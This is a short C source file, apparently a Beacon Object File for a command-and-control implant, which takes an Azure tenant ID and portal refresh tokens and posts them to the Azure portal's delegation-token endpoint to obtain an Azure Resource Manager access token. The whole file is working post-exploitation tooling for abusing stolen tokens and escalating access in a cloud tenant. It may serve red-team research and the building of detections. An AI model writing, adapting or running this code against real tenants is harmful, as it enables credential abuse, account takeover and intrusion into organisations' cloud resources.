/*
 * get_azurerm_token_with_portal_rt.c — BARK BOF
 * Get-AzureRMTokenWithPortalAuthRefreshToken — Portal delegation — get Azure RM token
 *
 * Args : tenantId, portalAuthRefreshToken, altPortalAuthRefreshToken
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char bodyBuf[8192];
    char  *tenantId = NULL, *portalToken = NULL, *altToken = NULL;

    BeaconDataParse(&parser, args, alen);
    tenantId    = BeaconDataExtract(&parser, NULL);
    portalToken = BeaconDataExtract(&parser, NULL);
    altToken    = BeaconDataExtract(&parser, NULL);

    if (!tenantId || MSVCRT$strlen(tenantId) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_get_azurerm_token_with_portal_rt <tenantId> <portalAuthRefreshToken> <altPortalAuthRefreshToken>\n");
        return;
    }
    if (!altToken) altToken = "";

    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"extensionName\":\"Microsoft_Azure_PIMCommon\","
        "\"resourceName\":\"\","
        "\"tenant\":\"%s\","
        "\"portalAuthorization\":\"%s\","
        "\"altPortalAuthorization\":\"%s\"}",
        tenantId, portalToken, altToken);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Get-AzureRMTokenWithPortalAuthRefreshToken for tenant %s\n", tenantId);
    BarkPortalPost(
        L"/api/DelegationToken"
        L"?feature.cacheextensionapp=false"
        L"&feature.internalgraphapiversion=true"
        L"&feature.tokencaching=false",
        bodyBuf);
}
